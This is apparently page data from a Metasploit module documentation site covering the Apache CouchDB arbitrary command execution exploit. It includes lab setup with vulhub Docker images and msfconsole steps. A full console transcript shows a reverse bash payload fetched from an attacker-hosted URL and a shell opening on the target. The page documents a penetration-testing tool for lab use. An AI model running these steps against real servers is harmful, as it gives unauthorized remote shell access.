{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/apache_couchdb_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"1247a18c-1237-5350-ad5f-c47933fe76d7","name":"Apache CouchDB Arbitrary Command Execution","fullname":"exploit/linux/http/apache_couchdb_cmd_exec","description":"CouchDB administrative users can configure the database server via HTTP(S).\n        Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB.\n        This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user,\n        including downloading and executing scripts from the public internet.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/apache_couchdb_cmd_exec","documentationSlug":"/modules/documentation/exploit/linux/http/apache_couchdb_cmd_exec","referencesSlug":"/modules/references/exploit/linux/http/apache_couchdb_cmd_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options\ninclude paths for operating system-level binaries that are subsequently launched by CouchDB.\nThis allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell\ncommands as the CouchDB user,including downloading and executing scripts from the public internet.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p><strong>Vulnerable Application Link</strong> </p>\n<ul>\n<li>docker  </li>\n</ul>\n<p>Couchdb 2.x: <a href=\"https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635</a><br>\nCouchdb 1.x: <a href=\"https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12636</a></p>\n<h3 id=\"vulnerable-application-installation-setup\" style=\"position:relative;\"><a href=\"#vulnerable-application-installation-setup\" aria-label=\"vulnerable application installation setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application Installation Setup.</h3>\n<p>Change dictory to CVE-2017-1263X, and run <code class=\"language-text\">docker-compose up -d</code> </p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the application</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use modules/exploits/linux/http/apache_couchdb_cmd_exec.rb</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n</ol>\n<p><code class=\"language-text\">[*] 192.168.77.139:5984 The target appears to be vulnerable.</code></p>\n<ol start=\"5\">\n<li>Do: <code class=\"language-text\">set srvhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set srvport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">set lhost &lt;ip&gt;</code></li>\n<li>Do: <code class=\"language-text\">set lport &lt;port&gt;</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"uripath\" style=\"position:relative;\"><a href=\"#uripath\" aria-label=\"uripath permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>URIPATH</h3>\n<p><code class=\"language-text\">URIPATH</code> by default is random, you can change it if you want.</p>\n<h3 id=\"httpusername-httppassword\" style=\"position:relative;\"><a href=\"#httpusername-httppassword\" aria-label=\"httpusername httppassword permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>HttpUsername, HttpPassword</h3>\n<p>Sometimes it requires authentication, set these options to authorize.  </p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"apache-couchdb-on-linux\" style=\"position:relative;\"><a href=\"#apache-couchdb-on-linux\" aria-label=\"apache couchdb on linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Apache CouchDB on Linux</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use modules/exploits/linux/http/apache_couchdb_cmd_exec.rb\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; show options \n\nModule options (exploit/linux/http/apache_couchdb_cmd_exec):\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   HttpPassword                   no        The password to login with\n   HttpUsername                   no        The username to login as\n   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST                          yes       The target address\n   RPORT         5984             yes       The target port (TCP)\n   SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT       8080             yes       The local port to listen on.\n   SSL           false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                        no        The URI to use for this exploit to download and execute. (default is random)\n   VHOST                          no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_bash):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; set rhost 192.168.77.139\nrhost =&gt; 192.168.77.139\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; check \n[*] 192.168.77.139:5984 The target appears to be vulnerable.\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; set srvhost 192.168.77.139 \nsrvhost =&gt; 192.168.77.139\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; set srvport 8888\nsrvport =&gt; 8888\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; set lhost 192.168.77.139 \nlhost =&gt; 192.168.77.139\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; exploit \n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.77.139:4444 \nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; [*] Using URL: http://192.168.77.139:8888/rXrdf2\n[*] 192.168.77.139:5984 - The 1 time to exploit\n[*] 192.168.77.139:5984 - Sending the payload to the server...\n[*] Command shell session 1 opened (192.168.77.139:4444 -&gt; 172.18.0.2:58348) at 2018-03-27 06:18:21 -0400\n[*] Server stopped.\nmsf5 exploit(linux/http/apache_couchdb_cmd_exec) &gt; sessions -i 1\n[*] Starting interaction with 1...\nid\nuid=1000(couchdb) gid=999(couchdb) groups=999(couchdb)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"1247a18c-1237-5350-ad5f-c47933fe76d7"}}}